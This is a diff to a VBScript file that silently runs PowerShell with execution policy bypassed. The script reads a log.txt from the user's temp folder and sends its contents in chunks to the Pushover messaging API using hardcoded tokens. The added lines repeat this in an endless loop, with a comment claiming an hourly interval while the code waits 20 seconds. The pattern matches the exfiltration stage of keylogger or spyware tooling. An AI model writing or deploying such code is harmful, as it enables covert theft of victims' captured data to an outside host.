@@ -12,18 +12,24 @@ If Not objFSO.FileExists(logFile) Then
     objFile.Close
 End If
 
-' Define PowerShell script
-psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
-    """$API_TOKEN='a4mbuegdv65j65d9buc4bzxezrsf4w'; " & _
-    "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
-    "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
-    "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
-    "$MESSAGE = Get-Content $FILE_PATH -Raw; $MAX_LENGTH = 1024; " & _
-    "while ($MESSAGE.Length -gt 0) { " & _
-    "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _
-    "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _
-    "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _
-    "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"""
+' Run API call in a loop every 1 hour
+Do
+    ' Define PowerShell script for API execution only
+    psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
+        """$API_TOKEN='a4mbuegdv65j65d9buc4bzxezrsf4w'; " & _
+        "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
+        "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
+        "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
+        "$MESSAGE = Get-Content $FILE_PATH -Raw; $MAX_LENGTH = 1024; " & _
+        "while ($MESSAGE.Length -gt 0) { " & _
+        "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _
+        "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _
+        "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _
+        "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"""
 
-' Run the PowerShell command (silent mode)
-objShell.Run "cmd /c " & psCommand, 0, True
+    ' Run the PowerShell command (silent mode)
+    objShell.Run "cmd /c " & psCommand, 0, True
+
+    ' Sleep for 1 hour (3600000 milliseconds)
+    WScript.Sleep 20000
+Loop
